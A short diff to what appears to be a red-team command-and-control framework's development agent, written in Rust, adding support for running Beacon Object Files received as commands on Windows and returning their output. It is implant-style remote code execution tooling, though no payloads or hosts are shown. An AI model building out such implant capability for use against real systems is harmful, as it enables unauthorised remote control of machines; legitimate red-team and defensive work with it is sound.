@@ -137,10 +137,28 @@ fn execute(cmd: Command, work_dir: &Path) -> Vec<Response> {
         Command::Download { path } => do_download(work_dir, &path),
         // P2/P3 executors (BOF, P2P connect, SOCKS) are implant-side; the dev
         // agent acks them as unimplemented so the wire types stay round-trippable.
-        Command::Bof { .. } | Command::Connect { .. } | Command::Socks { .. } => {
+        Command::Bof { blob, .. } => vec![bof_execute(&blob)],
+        Command::Connect { .. } | Command::Socks { .. } => {
             vec![Response::Err("not implemented in dev agent".into())]
         }
         Command::Exit => vec![Response::Ok],
+    }
+}
+
+/// Run a BOF (Windows/Wine via nyx-bof-runner) and return its BeaconPrintf
+/// output. On non-Windows the dev agent can't execute COFF machine code.
+fn bof_execute(blob: &[u8]) -> Response {
+    #[cfg(target_os = "windows")]
+    {
+        match nyx_bof_runner::execute(blob) {
+            Ok(r) => Response::BofOutput(r.output.into_bytes()),
+            Err(e) => Response::Err(format!("bof: {e}")),
+        }
+    }
+    #[cfg(not(target_os = "windows"))]
+    {
+        let _ = blob;
+        Response::Err("bof: not supported by the dev agent on this OS".into())
     }
 }
 
